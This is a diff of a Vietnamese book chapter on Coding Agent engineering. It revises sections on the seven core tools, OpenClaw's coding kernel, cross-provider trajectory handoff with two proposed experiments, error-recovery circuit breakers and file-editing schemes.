@@ -28,7 +28,9 @@ Một Coding Agent cơ bản chỉ cần được trang bị bảy công cụ c�
 6. **Công cụ tìm kiếm tên tệp (Glob)**: Định vị nhanh các tệp mục tiêu trong hệ thống tệp thông qua khớp mẫu, ví dụ: sử dụng ` **/*.py` để tìm tất cả các tệp Python trong dự án
 7. **Công cụ tìm kiếm nội dung file (Grep)**: Tìm kiếm một mẫu văn bản cụ thể trong nội dung file, chẳng hạn như tìm kiếm tất cả các dòng mã gọi một hàm nhất định
 
-Bảy công cụ này tạo thành một hộp công cụ hoàn chỉnh nhưng tối giản, có thể được tích hợp một cách hiệu quả về mặt chi phí vào hầu hết mọi hệ thống Agent. Về mặt triển khai, chúng có thể được hiển thị dưới dạng dịch vụ công cụ được tiêu chuẩn hóa thông qua giao thức MCP được giới thiệu trong Chương 4. Lưu ý rằng bộ công cụ này là cấu hình cơ bản duy nhất của Coding Agent, khác với năm phân loại công cụ chung trong Chương 4 (nhận thức/thực thi/cộng tác/kích hoạt sự kiện/giao tiếp người dùng) được chia theo hướng gọi và bản chất vai trò - bảy công cụ cốt lõi chủ yếu bao gồm hai loại nhận thức và thực thi. Người đọc có thể hỏi: Còn ba loại nhu cầu: cộng tác, kích hoạt sự kiện và giao tiếp với người dùng thì sao? - Trong Coding Agent thường được xử lý bởi khung Agent (chứ không phải lớp công cụ), ví dụ: Việc ủy quyền cho sub-Agent được xử lý bằng logic điều phối của khung thay vì thông qua các công cụ cộng tác chuyên dụng.
+Bảy công cụ này hợp thành một hộp đồ nghề đầy đủ mà lại cực gọn, hầu như hệ Agent nào cũng tích hợp được với chi phí thấp.
+
+Lưu ý rằng bộ công cụ này là cấu hình nền riêng của Coding Agent, khác với năm loại công cụ tổng quát ở chương 4 vốn được chia theo hướng gọi và tính chất tác động (nhận thức / thực thi / cộng tác / kích hoạt bởi sự kiện / giao tiếp với người dùng). Read, Write, Edit, Grep, Glob, Bash và trình thông dịch mã trong cách phân loại ấy đều thuộc công cụ thực thi hoặc công cụ nhận thức; còn việc Coding Agent cộng tác với Agent con thì do logic điều phối của framework quản lý, chứ không qua công cụ cộng tác chuyên dụng.
 
 Sử dụng tác vụ đơn giản nhất để xem bảy công cụ này phối hợp với nhau như thế nào. Giả sử người dùng nói "Hãy giúp tôi sắp xếp tất cả các nhận xét TODO trong dự án thành một danh sách":
 
@@ -49,19 +51,19 @@ Tác nhân: Đã hoàn thành, tìm thấy tổng cộng 3 mục TODO và danh s
 
 Toàn bộ quá trình chỉ sử dụng 2 công cụ: Grep (tìm kiếm nội dung) và Write (ghi file). Nếu tác vụ phức tạp hơn - chẳng hạn như "đếm số lượng TODO trong mỗi mô-đun và vẽ biểu đồ" - Agent cũng sẽ sử dụng Trình thông dịch mã để thực thi mã Python để thống kê và vẽ. Mặc dù bảy công cụ này rất đơn giản nhưng chúng có thể được kết hợp để hoàn thành nhiều nhiệm vụ rất đa dạng.
 
+Bạn đọc có thể thắc mắc: tại sao là bảy công cụ chứ không phải sáu? Thực ra, chỉ một công cụ Bash Shell là đủ. OpenAI Codex chỉ cung cấp duy nhất Bash Shell và thực hiện toàn bộ thao tác đọc ghi file, tìm kiếm bằng một công cụ đó. Nhưng một số Agent khác vẫn giữ lại các công cụ đọc ghi file riêng. Bảy công cụ trong sách này được tách riêng để bạn đọc dễ hình dung những năng lực cơ bản mà một Coding Agent cần có.
+
 Tại sao mọi Agent chung đều có khả năng mã hóa? Bởi vì việc tạo mã không chỉ đơn thuần là viết chương trình—nó còn là một công cụ giải quyết vấn đề có mục đích chung. Khi gặp suy luận toán học, bạn có thể viết một đoạn mã đưa cho bộ giải để tính ra đáp án chính xác; bạn cần củng cố các quy tắc kinh doanh và mã chính xác hơn nhiều so với mô tả bằng ngôn ngữ tự nhiên; nếu bạn thiếu một công cụ nào đó, bạn có thể viết một công cụ tạm thời; nếu định dạng dữ liệu thay đổi, logic phân tích cú pháp sẽ được tạo động. Những kịch bản này sẽ được phát triển lần lượt trong phần còn lại của chương này. Agent với khả năng mã hóa cơ bản, ngay cả khi chỉ có bảy công cụ đơn giản trên trong hộp công cụ, vẫn có thể linh hoạt mở rộng khả năng của nó khi gặp nhu cầu mới.
 
 ### Case: Từ Manus đến OpenClaw - Coding kernel của General Agent
 
-Các sản phẩm Agent đa dụng như Manus và OpenClaw kết hợp ba năng lực lớn — Nghiên cứu sâu, Sử dụng máy tính và Mã hóa — trong một hệ thống duy nhất. Vậy tại sao phần mở đầu của chương này lại gọi Coding Agent là lõi thay vì một trong hai năng lực còn lại?
+Những sản phẩm Agent đa dụng tiêu biểu như Manus, OpenClaw hợp nhất ba năng lực lớn vào cùng một hệ thống: Deep Research (nghiên cứu sâu), Computer Use (điều khiển máy tính) và Coding (sinh mã). Vậy vì sao ở đầu chương lại nói Coding Agent mới là cốt lõi trong số đó, chứ không phải hai năng lực kia?
 
 Bởi vì hầu như mọi hoạt động tạo nội dung hiệu quả cuối cùng đều quy về mã. Các bản trình bày PowerPoint và tài liệu Word về bản chất là mã ở định dạng OOXML (Office Open XML, chuẩn mở của Microsoft cho tài liệu văn phòng). Báo cáo PDF có thể được tạo thông qua Markdown, HTML hoặc LaTeX; các tập lệnh Python có thể thực hiện phân tích và trực quan hóa dữ liệu; ngay cả các chuỗi thao tác trình duyệt thành công từ công việc GUI cũng có thể được ghi lại thành mã có thể tái sử dụng (xem Chương 9). Tìm kiếm và tổng hợp thông tin của Deep Research có thể được triển khai thông qua các yêu cầu web và phân tích cú pháp do mã điều khiển. Computer Use linh hoạt hơn, nhưng các lệnh gọi trực tiếp bằng mã hoặc API thường rẻ hơn, nhanh hơn và đáng tin cậy hơn cho những thao tác tương đương. Tạo mã là nền tảng năng lực hiệu quả nhất, chi phí thấp nhất và có thể tái sử dụng nhiều nhất.
 
-
 ![Hình 5-1 Lõi Coding Agent trong kiến trúc OpenClaw](images/fig5-1.svg)
 
-
-Sử dụng luồng thực thi cụ thể để hiểu kiến trúc này. Giả sử người dùng yêu cầu “Giúp tôi phân tích số liệu bán hàng quý trước và tạo báo cáo tóm tắt”:
+Hãy hiểu kiến trúc này qua một luồng thực thi cụ thể. Giả sử người dùng yêu cầu: "Help me analyze last quarter's sales data and create a summary report".
 
 1. **Đọc bộ nhớ**: Agent đọc `MEMORY.md` và nhận thấy rằng người dùng thích báo cáo ở định dạng PDF. Nguồn dữ liệu là Google Trang tính
 2. **Công cụ điều chỉnh**: Lấy phương thức sử dụng Google Trang tính API thông qua mô-đun tìm kiếm mạng và tải xuống dữ liệu thông qua thực thi mã
@@ -77,16 +79,7 @@ Quan trọng hơn, Agent có khả năng ghi tệp, nghĩa là nó có thể **t
 
 **Ranh giới khả dụng: Agent nào lấy Mã hóa làm kiến trúc cốt lõi.** Kết luận rằng “Coding Agent là lõi của một Agent đa dụng” chủ yếu áp dụng cho **các Agent đa dụng nhắm đến nhiệm vụ mở** — những kịch bản như nghiên cứu sâu, tạo nội dung và xử lý dữ liệu, nơi ranh giới nhiệm vụ không chắc chắn và dạng hiện vật rất đa dạng. Trong các kịch bản này, không thể liệt kê trước tất cả công cụ cần thiết; việc tạo mã, với tư cách một siêu khả năng, cung cấp con đường kinh tế nhất để mở rộng linh hoạt ranh giới năng lực, khiến nó trở thành lõi của kiến trúc. Trái lại, các Agent dịch vụ khách hàng theo chiều dọc hoạt động trong không gian nhiệm vụ tương đối khép kín, với kiến trúc cốt lõi được xây dựng quanh các quy trình nghiệp vụ cố định, công cụ miền và chiến lược đối thoại; ở đó, mã là một công cụ trong hộp công cụ chứ không phải trung tâm kiến trúc. Tuy nhiên, ngay cả trong trường hợp sau, mã hóa vẫn là một năng lực nền tảng quan trọng: tính toán chính xác, xử lý dữ liệu và xác minh quy tắc đều phụ thuộc vào nó.
 
-Tiếp theo, chúng tôi thảo luận về hai thiết kế kiến trúc bảo mật và tương tác "sẵn sàng sử dụng", thoạt nhìn không liên quan gì đến chủ đề Coding Agent. Tuy nhiên, họ trực tiếp xác định cách Agent quản lý môi trường thực thi mã và trạng thái hệ thống tệp, đây là mối quan tâm cốt lõi của Coding Agent. (Bạn đọc muốn hiểu từng bước cách hoạt động của Coding Agent có thể bỏ qua phần "Quy trình tổng thể của Coding Agent" bên dưới, sau đó quay lại đây để xem thiết kế tương tác và bảo mật.)
-
-OpenClaw áp dụng thiết kế **Sessionless** (không có phiên): không có các bước như cài đặt, đăng nhập và "mở ứng dụng". Đại lý luôn trực tuyến và người dùng có thể nhận được phản hồi bất kỳ lúc nào bằng cách gửi tin nhắn qua nền tảng nhắn tin mà họ đang sử dụng. Biểu mẫu tương tác này cùng kiến trúc Gateway định tuyến tin nhắn và hướng sự kiện đằng sau nó đã được thảo luận chi tiết trong phần công cụ giao tiếp với người dùng ở Chương 6 và sẽ không được mở rộng ở đây. Điều đáng nhấn mạnh là tiền đề cho việc thành lập hình thức này là mô hình lớn đã đủ trưởng thành để phục vụ như một "cơ sở thông minh" mới - tương tự như hệ điều hành truyền thống che chắn phần cứng và cung cấp khả năng trừu tượng hóa thông minh thống nhất cho Tác nhân lớp trên. Chính nhờ cơ sở này mà hình thức "vĩnh viễn + đáp ứng" có thể được thiết kế với chi phí thấp.
-
-Đối với Coding Agent, khó khăn kỹ thuật thực sự của Sessionless là làm thế nào môi trường thực thi mã và trạng thái hệ thống tệp tồn tại qua các tin nhắn. Hai tin nhắn của người dùng có thể cách nhau vài phút hoặc vài ngày và hoạt động của Agent dựa vào một số lượng lớn các trạng thái tiềm ẩn: các gói phụ thuộc được cài đặt trong hộp cát, thư mục làm việc và các biến môi trường trong phiên cuối, máy chủ phát triển chạy trong nền và các tệp được viết một nửa. Cách tiếp cận của OpenClaw là chia trạng thái thành hai cấp quản lý. **Trạng thái hệ thống tệp có tính ổn định tự nhiên** - thư mục không gian làm việc được gắn vào bộ lưu trữ liên tục bên ngoài hộp cát và mã, dữ liệu cũng như các sản phẩm trung gian sẽ không bị mất khi gửi thư hoặc khi khởi động lại hộp cát. Đây là một ý nghĩa khác của "hệ thống tệp đóng vai trò là trung tâm Agent". **Trạng thái quy trình được duy trì hoặc được xây dựng lại theo yêu cầu** - hộp cát và phiên cuối trong đó vẫn chạy trong thời gian hoạt động, tránh khởi động nguội, chuyển đổi lại thư mục và kích hoạt lại môi trường ảo cho mỗi tin nhắn; nó bị phá hủy sau khi hết thời gian chờ để tái chế tài nguyên. Trước khi hủy, trạng thái môi trường có thể tuần tự hóa (thư mục làm việc, biến môi trường, danh sách tác vụ nền) được ghi vào tệp không gian làm việc và sẽ được Agent xây dựng lại theo bản ghi khi nó được đánh thức vào lần tiếp theo. Phiên cuối liên tục được thảo luận trong "Tính bền vững trạng thái của môi trường thực thi lệnh" ở phần sau của chương này là bản sao của cơ chế này trong một nhiệm vụ duy nhất; Sessionless mở rộng vấn đề tương tự sang thang thời gian giữa các tin nhắn và nhiều ngày.
-
-Sessionless không phải là không cần bảo trì - điều đó có nghĩa là mỗi tin nhắn người dùng cần tải lại toàn bộ trajectory và trạng thái làm việc, do đó, nó có yêu cầu cao hơn về hiệu quả tuần tự hóa trạng thái và chiến lược nén trajectory; Bản thân các nguyên tắc thiết kế nén trajectory đã được thảo luận trong Chương 2 "Policy nén ngữ cảnh", chương này tập trung vào sự cân bằng kỹ thuật trong kiến trúc Sessionless.
-
 ### Quy trình tổng thể của Coding Agent
-
 
 ![Hình 5-2 Quy trình làm việc của Tác nhân mã hóa ](images/fig5-2.svg)
 
@@ -98,7 +91,7 @@ Nếu thiếu tài liệu chính, Agent không nên bắt đầu làm việc ở
 
 Tài liệu dự án hiện có dạng đặc biệt dành cho Agent: **Tệp hướng dẫn dự án**. Các tệp như CLAUDE.md, AGENTS.md, .cursorrules, v.v. đã trở thành tiêu chuẩn thực tế trong ngành - chúng được tự động đưa vào ngữ cảnh vào đầu mỗi phiên và hoạt động như lời nhắc hệ thống cấp dự án. Không giống như README dành cho người đọc, tệp hướng dẫn mang các quy ước hành vi cho Agent: lệnh xây dựng và kiểm tra ("sử dụng `pnpm test` thay vì `npm test`"), kiểu mã hóa ("cấm dùng kiểu `any`") và xóa các khu vực hạn chế ("không sửa đổi thư mục `migrations/`"). Đây là ứng dụng của cùng một ý tưởng ở các cấp độ khác nhau với `SOUL.md` của OpenClaw (xác định các quy tắc nhận dạng và hành vi của Agent) và `MEMORY.md` (kết thúc trải nghiệm phiên chéo): SOUL.md quy định "Agent là ai" và tệp hướng dẫn dự án quy định "cách làm việc trong dự án này". Từ góc độ kỹ thuật ngữ cảnh trong Chương 2, tệp hướng dẫn vẫn là tiền tố ổn định và tiết kiệm nhất - nội dung không thay đổi theo nhiệm vụ và thân thiện một cách tự nhiên với KV Cache; nó cũng là cách thực hiện trực tiếp nhất nguyên tắc "kiến thức phải tồn tại trong chính cơ sở mã".
 
-Có một hệ quả tất yếu thú vị đối với nguyên tắc trình bày kiến thức: **Các nhóm thân thiện khi làm việc từ xa có xu hướng thân thiện với AI Agent**. Các nhóm từ xa buộc phải dựa vào tài liệu và giao tiếp không đồng bộ - các quyết định được ghi lại trong tài liệu, ngữ cảnh được viết trong vấn đề và mô tả PR, đồng thời kiến thức về bộ lạc được lưu giữ trong hướng dẫn dành cho nhà phát triển, thay vì dựa vào việc truyền tải bằng lời nói tại máy trạm và bảng trắng trong phòng hội nghị. Đây chính xác là dạng kiến thức mà Agent có thể sử dụng: Agent không thể đọc các thỏa thuận bằng lời nói, nhưng có thể đọc tài liệu thiết kế. Mặt khác, một nhóm chủ yếu dựa vào việc "hãy hỏi đồng nghiệp ngồi cạnh bạn" sẽ có chi phí bắt đầu cao tương đương, đối với cả nhân viên mới từ xa và Agent. Để đánh giá cấp độ "AI-ready" của một nhóm, một chỉ báo proxy đơn giản là: liệu người mới từ xa có thể làm việc độc lập chỉ dựa vào kho mã và tài liệu hay không.
+Đây chính là chỗ mà nhận định ở chương 2 — "đội ngũ thân thiện với làm việc từ xa thường cũng thân thiện với AI Agent" — đáp xuống ở tầng kho mã: quyết định được ghi trong tài liệu, ngữ cảnh được viết trong mô tả issue và PR, kinh nghiệm nội bộ lắng lại trong sổ tay lập trình viên, thì Agent mới đọc được. Từ đó có thể rút ra một thước đo giản dị cho mức độ "AI-ready" của một đội: **một người mới làm từ xa, chỉ dựa vào kho mã và tài liệu, có tự mình bắt đầu làm việc được hay không.**
 
 **Hiểu rõ nhiệm vụ và làm rõ yêu cầu.**
 
@@ -202,6 +195,28 @@ Lỗi tầng công cụ đi theo một hướng khác: **không dừng phiên, m
 
 Nguyên tắc cốt lõi của mục này là: **ranh giới xử lý lỗi không phải là một yêu cầu đơn lẻ, mà là toàn bộ vòng lặp khôi phục**. Trước khi xác nhận là không thể khôi phục, lỗi trung gian không nên phơi bày cho bên tiêu thụ — dù đó là người dùng hay hệ thống hạ nguồn đăng ký sự kiện: trong lúc khôi phục thì giữ lại thông báo lỗi, khôi phục thành công thì bên tiêu thụ không hề hay biết, thất bại toàn bộ mới nhất loạt phát ra. Đây chính là sự công trình hóa của nguyên tắc hiệu chỉnh ở Chương 1 — "không phơi bày trạng thái trung gian trước khi xác nhận là không thể khôi phục".
 
+**Bàn giao: đưa một quỹ đạo chạy dở cho mô hình khác.** Khi mô hình chính tiếp tục không dùng được, phải đổi sang nhà cung cấp khác chạy nốt quỹ đạo này. Trở ngại thật sự không nằm ở chỗ địa chỉ giao diện khác nhau, mà ở chỗ trong quỹ đạo có một phần chỉ thuộc về nhà cung cấp ban đầu. Lời gọi công cụ và kết quả công cụ tuy khác cấu trúc giữa các nhà cung cấp nhưng cùng một ngữ nghĩa, kết xuất lại là đủ; khó là phần suy luận của mô hình. Suy luận thường gồm hai phần: một phần là văn bản đọc được, phần kia là chứng thư mà nhà cung cấp gắn kèm để chứng minh đoạn suy luận đó đúng là do chính nó sinh ra. Văn bản đổi sang mô hình khác vẫn đọc hiểu được, còn chứng thư đổi nhà cung cấp là mất hiệu lực — **bàn giao xuyên nhà cung cấp mang đi được văn bản, không mang đi được chứng thư**.
+
+Yêu cầu của các nhà cung cấp đối với chứng thư không giống nhau. Đầu dễ dãi hoàn toàn không kiểm tra, đầu nghiêm ngặt thì từ chối mọi chứng thư không do chính mình cấp. Chứng thư cũng chưa chắc gắn vào phần suy luận, nó còn có thể gắn vào lời gọi công cụ. Vì thế chiến lược trông có vẻ chắc chắn "xóa sạch suy luận là an toàn" lại chính là thứ không lọt được ở một số nhà cung cấp. Phương án bàn giao chỉ có thể thiết kế theo đầu nghiêm ngặt nhất, đồng thời chuẩn bị sẵn đường lui cho những trường hợp không đáp ứng nổi yêu cầu: viết lại các lời gọi công cụ trong lịch sử thành lời kể bằng văn bản; mô hình không còn coi chúng là công cụ thật sự đã gọi, nhưng ít ra vẫn chạy tiếp được.
+
+Từ đó rút ra một nguyên tắc thiết kế: quỹ đạo không nên lưu theo định dạng giao diện của bất kỳ nhà cung cấp nào, mà nên giữ ở một định dạng trung lập. Mỗi đoạn suy luận tách thành phần văn bản mang đi được và phần chứng thư không mang đi được; lời gọi công cụ chỉ ghi tên và tham số, còn định danh thì sinh lại theo nhà cung cấp đích khi kết xuất thành yêu cầu cụ thể. Khi chuyển đổi, chứng thư luôn luôn bị bỏ, còn văn bản được đưa vào với tư cách nội dung thông thường, chứ không nhét ngược vào chỗ nhà cung cấp đích dành cho suy luận. Bản tóm tắt suy luận mà nhà cung cấp trả về vốn chính là bản sao mang đi được chuẩn bị cho tình huống này: giữ lại là đủ, không cần gọi thêm một lượt mô hình để nén lại. Giá trị của quỹ đạo trung lập cũng không chỉ giới hạn ở chuyển đổi khi sự cố: việc phát lại đánh giá ở chương 7, việc dựng mẫu huấn luyện ở chương 8 và việc trích xuất kinh nghiệm ở chương 9 đều dựa trên cùng một sản phẩm.
+
+> **Thử nghiệm 5-1 ★★★: Bàn giao quỹ đạo xuyên nhà cung cấp**
+>
+> **Mục tiêu thử nghiệm**: Xác minh xem một định dạng quỹ đạo trung lập có cho phép một quỹ đạo Agent mới chạy được nửa chừng đổi sang mô hình khác chạy nốt hay không, và định lượng cái giá của hai cách làm "chuyển nguyên xi" và "cắt bỏ sạch".
+>
+> **Giải pháp kỹ thuật**: Dùng một nhiệm vụ cần nhiều lượt gọi công cụ; đến giữa chừng thì tiêm liên tiếp các phản hồi giới hạn tốc độ và quá tải cho nhà cung cấp hiện tại, sau khi cầu dao ngắt thì chuyển sang nhà cung cấp khác và chạy tiếp. Quỹ đạo lưu theo định dạng trung lập: suy luận tách thành văn bản mang đi được và chứng thư không mang đi được, lời gọi công cụ chỉ ghi tên và tham số. Đối chiếu ba cách làm: **chuyển thẳng** bê nguyên các thông điệp của nhà cung cấp cũ vào cấu trúc của nhà cung cấp mới; **cắt bỏ** xóa toàn bộ suy luận và chứng thư; **trung lập** bỏ chứng thư, đưa văn bản hoặc bản tóm tắt suy luận do nhà cung cấp trả về vào với tư cách nội dung thông thường, sinh lại định danh theo nhà cung cấp đích, và với bên nhận bắt buộc phải có chứng thư thì viết lại các lời gọi cũ thành văn bản. Chọn ba nhà cung cấp có định dạng giao diện khác nhau và chuyển đổi từng cặp.
+>
+> **Tiêu chí chấp nhận**: Yêu cầu đầu tiên sau mỗi lần chuyển đều phải giữ lại phản hồi gốc; thất bại của cách chuyển thẳng phải là lỗi thật do nhà cung cấp trả về, không được thay bằng lỗi mô phỏng. Yêu cầu cách trung lập không phát sinh lỗi giao diện trên mọi tổ hợp nhà cung cấp; hai cách còn lại hỏng ở tổ hợp nào, báo lỗi gì thì ghi lại trung thực. So sánh ba cách về tỷ lệ hoàn thành nhiệm vụ, số lần gọi lại cùng một công cụ sau khi chuyển (tính theo vân tay "tên công cụ + tham số"), và số lượt cùng số token phụ trội cần để hoàn thành sau khi chuyển. Nếu cách trung lập không tốt hơn cách cắt bỏ về số lần gọi lặp, cũng ghi lại trung thực như vậy.
+
+> **Thử nghiệm 5-2 ★★: Viết tiếp sau khi đầu ra bị đứt giữa chừng**
+>
+> **Mục tiêu thử nghiệm**: So sánh "gửi lại cả lượt" với "lấy đoạn đầu ra dang dở làm tiền tố rồi viết tiếp" về chi phí, tính đúng đắn và tác dụng phụ.
+>
+> **Giải pháp kỹ thuật**: Cắt kết nối tại ba điểm trên phản hồi dạng luồng — giữa chừng suy luận, giữa chừng phần văn bản, và giữa chừng tham số của lời gọi công cụ. Ba cách khôi phục: bỏ đoạn dang dở và gửi lại cả lượt; đính đoạn dang dở làm thông điệp assistant cuối cùng rồi yêu cầu mô hình viết tiếp (có nhà cung cấp hỗ trợ sẵn, có nhà cung cấp đòi đánh dấu rõ đây là thông điệp chờ viết tiếp, nhà cung cấp không có giao diện này thì lùi về cách kế tiếp); thêm một chỉ thị siêu dữ liệu nói rõ hãy tiếp tục từ điểm đứt. Lời gọi công cụ dang dở không thể gửi trả ở cấu trúc gốc, phải chuyển thành văn bản cho mô hình bổ sung nốt, ghép lại rồi phân tích và kiểm tra lại. Nếu trong đoạn dang dở đã có công cụ được thực thi sớm do luồng, trước khi viết tiếp phải khử trùng lặp theo vân tay lời gọi để tránh lặp lại tác dụng phụ.
+>
+> **Tiêu chí chấp nhận**: Lặp lại mỗi loại điểm đứt vài lần và báo cáo, cho từng cách, tỷ lệ khôi phục thành công, số token đầu ra tiết kiệm được so với gửi lại cả lượt, tỷ lệ hợp lệ và tỷ lệ đúng ngữ nghĩa của tham số sau khi bổ sung (chỗ ghép nối rất dễ thừa khoảng trắng hoặc lặp ký tự, hợp lệ không đồng nghĩa với đúng), cùng số lần tác dụng phụ bị lặp. Đồng thời ghi lại điểm đứt nào không tái hiện được ở nhà cung cấp nào, và đường lui có dùng được hay không.
+
 **Dừng: mỗi đường khôi phục đều phải có ngưỡng trên.** Bản thân cơ chế khôi phục cũng có thể thất bại, nên mỗi đường khôi phục đều phải có ngưỡng ngắt mạch rõ ràng: nén ngữ cảnh thất bại liên tiếp mấy lần thì bỏ nén, phân loại quyền thất bại liên tiếp thì lui về hỏi người, tiếp nối đầu ra thử tối đa một số vòng cố định. Ngưỡng lấy từ đâu? Câu trả lời là dữ liệu sản xuất chứ không phải phỏng đoán. Lấy ngắt mạch khi nén của Claude Code làm ví dụ, ngưỡng "3 lần liên tiếp" đến từ thống kê phiên thực tế — từng có một phiên thất bại liên tiếp hơn ba nghìn lần trên đúng đường khôi phục này, chỉ riêng loại thử lại vô ích này mỗi ngày đã lãng phí khoảng 250 nghìn lời gọi API trên toàn cầu; hơn một nghìn phiên từng gặp trên 50 lần thất bại liên tiếp. Con số 3 chính là điểm ngoặt kinh nghiệm giữa "tuyệt đại đa số sự cố đã khôi phục trước mốc này" và "thử lại tiếp về cơ bản là vô vọng".
 
 Ẩn hơn cả ngắt mạch đơn điểm là **xoáy ốc tử thần**: logic được kích hoạt trên đường lỗi tự nó lại gọi LLM, lại lỗi, kích hoạt dây chuyền. Một hình thái dây chuyền có thật: Agent dừng vì tràn ngữ cảnh, kích hoạt stop hook "tự động commit mã khi kết thúc" (logic dọn dẹp tự động chạy khi Agent kết thúc), hook gọi LLM để sinh commit message, lại tràn ngữ cảnh, lại kích hoạt hook. Phòng thủ dựa vào hai điều: trên đường lỗi vô hiệu hóa mọi logic có tác dụng phụ sẽ lại gọi mô hình (thà bỏ một chức năng phụ trợ, như trích xuất ký ức tự động), và dùng bộ đếm độ sâu đệ quy để phát hiện và cắt đứt chuỗi dây chuyền còn sót. Cuối cùng, trên tất cả các cơ chế tự động hóa còn cần các điều kiện dừng và nâng cấp toàn cục: số vòng lặp tối đa, trần ngân sách phiên, và khi số lần thất bại liên tiếp vượt ngưỡng thì nâng cấp lên can thiệp thủ công.
@@ -279,24 +294,21 @@ Khó khăn của việc chỉnh sửa tệp không phải ở bản thân thao t
 
 ![Hình 5-4 So sánh năm giải pháp chỉnh sửa tệp ](images/fig5-4.svg)
 
-
 **Mô tả sự khác biệt + Áp dụng mô hình**: Mô hình không trực tiếp chỉ định cách chỉnh sửa tệp mà tạo ra một mô tả thay đổi - nó có thể là một văn bản khác biệt tương tự như git diff (nghĩa là định dạng "dòng nào đã bị xóa và dòng nào đã được thêm" xuất ra bằng lệnh `git diff`) hoặc nó có thể là một khung mã có dấu ba chấm (bỏ qua các phần chưa sửa đổi với các nhận xét như "không thay đổi ở đây"). Sau đó, mô tả này được chuyển giao cho một "Mô hình áp dụng" chuyên dụng — thường là một LLM nhỏ hơn, nhanh hơn — chịu trách nhiệm hợp nhất nó với tệp gốc và tạo ra một tệp mới hoàn chỉnh. Thiết kế tách biệt các mối quan tâm này cho phép mô hình chính tập trung vào logic mã cấp cao và mô hình ứng dụng tập trung vào các hoạt động văn bản cấp thấp. Điểm yếu của việc triển khai ngây thơ nằm ở quá trình hợp nhất: khi có một chút khác biệt giữa mô tả thay đổi và mã thực tế của tệp, cần phải xác định xem nó có ở cùng một vị trí hay không. Khi có nhiều đoạn mã giống nhau có thể bị gộp vào sai vị trí. Cursor là đại diện cho sự phát triển liên tục của tuyến đường này: mô hình chính xuất ra khung mã có dấu thiếu sót và mô hình nhỏ fast-apply được đào tạo đặc biệt viết lại tệp hoàn chỉnh và sử dụng giải mã suy đoán (xác minh song song bằng cách sử dụng nội dung tệp gốc làm bản nháp) để đạt được tốc độ hợp nhất hàng nghìn mã thông báo mỗi giây - đầu tư kỹ thuật được đổi lấy độ tin cậy và tốc độ của tuyến đường này.
 
 **Chuỗi cũ thành chuỗi mới**(Chuỗi cũ → Chuỗi mới): Lược đồ được áp dụng bởi Claude Code. Mô hình cung cấp chuỗi cũ (văn bản gốc sẽ được thay thế) và chuỗi mới (văn bản mới sau khi thay thế) và khung thực hiện tìm kiếm và thay thế chuỗi đơn giản. Ưu điểm là khả năng dự đoán và tính minh bạch - chuỗi cũ thành công nếu nó tồn tại và là duy nhất trong tệp, nếu không thì không thành công, không có sự mơ hồ. Cái giá là khi xóa một đoạn mã lớn, tất cả nội dung gốc cần phải được xuất ra hoàn toàn, sai lệch một ký tự sẽ khiến việc khớp không thành công; khi cùng một mã xuất hiện nhiều lần, cần cung cấp ngữ cảnh dài hơn để loại bỏ sự mơ hồ.
 
 **Định vị số dòng**(Số dòng cũ → Chuỗi mới): Mô hình chỉ định "Xóa các hàng X đến Y và chèn nội dung mới". Số dòng chính xác và rõ ràng và chỉ cần hai số để xóa các phần lớn. Tuy nhiên, mô hình "đếm" số dòng dễ mắc lỗi, đặc biệt khi tệp rất dài. Trong thực tế, số dòng thường được thêm vào mỗi dòng khi đọc tệp để giảm bớt vấn đề. Tuy nhiên, số dòng tiếp theo sẽ thay đổi sau mỗi lần chỉnh sửa, điều này hạn chế tính song song của nhiều lần chỉnh sửa.
 
-**Các lệnh chỉnh sửa giống Vim**: Dựa trên hệ thống lệnh của trình soạn thảo Vim, nó hỗ trợ các thao tác phong phú như sao chép, cắt và dán. Rất hiệu quả trong việc sắp xếp lại mã (di chuyển các chức năng từ nơi này sang nơi khác). Tuy nhiên, gánh nặng học tập cú pháp lệnh là tương đối lớn. Mô hình mạnh nhất có thể được sử dụng tốt hơn nhưng tỷ lệ lỗi của các mô hình nhỏ hơn sẽ tăng lên đáng kể.
+**Lệnh chỉnh sửa kiểu Vim**: mượn hệ lệnh của trình soạn thảo Vim, hỗ trợ những thao tác phong phú như sao chép, cắt, dán. Rất hiệu quả cho việc tái tổ chức mã (dời một hàm từ chỗ này sang chỗ khác). Nhưng gánh nặng học cú pháp lệnh khá lớn: mô hình mạnh nhất dùng được khá tốt, còn mô hình nhỏ hơn thì tỉ lệ sai tăng lên rõ rệt. Cách này cũng không thân thiện với việc mô hình sau một lần suy nghĩ xuất ra nhiều lệnh chỉnh sửa, bởi ở Vim, sau mỗi lần sửa thì nội dung tệp lẫn số dòng đều thay đổi, mà mô hình rất khó tính trước số dòng sau khi sửa. Nghĩ sâu hơn: những trình soạn thảo mã như Vim được thiết kế cho con người, và **con người cần liên tục nhìn thấy trạng thái hiện tại rồi hoạch định một thao tác đơn giản kế tiếp** (viết một dòng mã, hay xóa vài dòng). Nhưng ngày nay **cách làm việc của mô hình là suy nghĩ khá lâu rồi tiến hành hàng loạt những thao tác tương đối phức tạp** (chẳng hạn viết vài trăm dòng mã).
 
 **Khớp đầu và đuôi chuỗi**(Chuỗi cũ Bắt đầu + Kết thúc → Chuỗi mới): có thể được coi là sự cải tiến của sơ đồ thay thế chuỗi cũ. Mô hình không cần xuất ra chuỗi cũ hoàn chỉnh. Nó chỉ cần cung cấp vài dòng đầu và vài dòng cuối của nội dung cần xóa, phần giữa có thể bỏ qua. Khung định vị vùng thay thế bằng cách khớp phần đầu và phần cuối này, miễn là cặp kết hợp "đầu và đuôi" này là duy nhất trong tệp thì nó có thể được định vị chính xác. Lược đồ này kết hợp độ tin cậy của việc thay thế văn bản với hiệu quả của lược đồ đánh số dòng - không cần xuất ra hàng trăm dòng mã gốc khi xử lý việc xóa các phần mã lớn, chỉ cần hiển thị các ranh giới. Đồng thời, do vẫn dựa trên việc khớp nội dung chứ không dựa trên số dòng trừu tượng nên nguy cơ xảy ra lỗi mô hình là tương đối thấp.
-
